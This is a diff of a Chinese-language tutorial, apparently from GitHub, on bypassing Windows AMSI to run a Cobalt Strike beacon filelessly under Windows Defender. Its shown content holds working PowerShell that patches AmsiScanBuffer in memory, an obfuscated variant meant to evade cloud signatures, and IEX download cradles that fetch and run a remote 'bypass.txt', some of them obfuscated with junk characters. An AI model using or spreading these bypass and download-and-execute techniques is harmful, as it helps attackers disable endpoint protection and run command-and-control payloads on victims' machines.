@@ -3,7 +3,7 @@
 
 
 
-## 0x01.通过修补 AMSI.dll 的操作码绕过ASMI
+# 0x01.通过修补 AMSI.dll 的操作码绕过ASMI
 
 1.用cobaltstrike生成一个beacon.ps1,当然你用generator也可以
 ![image](https://user-images.githubusercontent.com/89376703/155735798-0388189e-ec01-47d4-976c-799891746687.png)
@@ -14,7 +14,7 @@
 
 
 
-注意我这里用的是64位的stageless，所以文件比较大
+# 注意我这里用的是64位的stageless，所以文件比较大
 
 
 ![image](https://user-images.githubusercontent.com/89376703/155733969-384abfb3-64be-4c93-b2b8-c7c60ea8dd13.png)
@@ -37,13 +37,11 @@
 ![image](https://user-images.githubusercontent.com/89376703/155734244-a2185115-0d62-4b8c-96f0-7e09b6caf530.png)
 
 
-$Address 后面一串就是base64解密公式。然后用IEX 去执行这个字符串变量
+# $Address 后面一串就是base64解密公式。然后用IEX 去执行这个字符串变量
 
 ![image](https://user-images.githubusercontent.com/89376703/155734381-81a55fb3-78f8-4303-b78a-0e88702ff2fb.png)
 
-但是amsi.dll对IEX是有严格限制的，直接执行解密密文必然会 被拦截
-
-因此这里我们需要一段破坏或者劫持amsi.dll的ps代码
+# 但是amsi.dll对IEX是有严格限制的，直接执行解密密文必然会被拦截，因此这里我们需要一段破坏或者劫持amsi.dll的ps代码
 
 ```
 $Win32 = @"
@@ -67,7 +65,7 @@ $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
 ```
 
-当然如果你怕代码被云标记的话可以加一些混淆，比如说字符串的分裂，或者转换成ASCLL字符码
+# 当然如果你怕代码被云标记的话可以加一些混淆，比如说字符串的分裂，或者转换成ASCLL字符码
 
 ```
 #导入API 函数
@@ -99,21 +97,21 @@ $hquzq = [Byte[]] ($jniv,$kgmv,$odgn,$zalk,+$cfun,+$macm)
 [System.Runtime.InteropServices.Marshal]::Copy($hquzq, 0, $bhijoj, 6)
 ```
 
-将混淆过后的代码插入解密代码中
+# 将混淆过后的代码插入解密代码中
 
 ![image-20220225171012792](C:\Users\16915\Desktop\bypass asmi\image-20220225171012792.png)
 
-放在windows defender环境下无文件执行即可
+# 放在windows defender环境下无文件执行即可
 
 ![image](https://user-images.githubusercontent.com/89376703/155734476-9c71d493-28df-4b6d-890f-069301c2312b.png)
 
-可以看到可以绕过微软，能执行一些基本的命令，但是dumplass应该不行。
+# 可以看到可以绕过微软，能执行一些基本的命令，但是dumplass应该不行。
 
 ## **绕过原理**
 
 2018 年 5 月，CyberArk 发布了 POC 代码，通过修补其功能之一，即 AmsiScanBuffer() 来绕过 AMSI
 
-AmsiScanBuffer 的API原型
+# AmsiScanBuffer 的API原型
 
 ```
 HRESULT AmsiScanBuffer(
@@ -183,9 +181,9 @@ IEX ((new-object net.webclient).downloadstring("http://10.@!#$%^&*()21@!#$%^&*()
 IEX([Net.Webclient]::new().DownloadString("http://0.0.0.0:8000/bypass.txt".))
 ```
 
-这个方法和方式二类似，本质上还是用webclient去连接服务端的方式进行通信
+# 这个方法和方式二类似，本质上还是用webclient去连接服务端的方式进行通信
 
-混淆后的样本为
+# 混淆后的样本为
 
 ```
 IEX([Net.Webclient]::new().DownloadString("h%%%t%%%tp:%%%//10.212.2@@@@@02.188@@@@@:80@@@@@00/bypas%%%s.tx%%%t".Replace('@@@@@','').Replace('%%%','')))
